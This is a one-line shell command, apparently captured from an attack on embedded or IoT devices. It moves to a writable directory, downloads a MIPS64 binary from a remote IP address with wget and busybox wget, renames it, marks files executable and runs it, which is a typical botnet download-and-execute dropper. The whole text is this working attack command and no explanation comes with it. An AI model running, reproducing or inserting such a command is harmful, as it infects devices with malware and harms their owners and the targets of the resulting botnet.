cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.42.3/bins/ssh.mips64; /bin/busybox wget http://209.141.42.3/bins/ssh.mips64;cat ssh.mips64 >qwacdw;chmod +x *;./qwacdw ssh
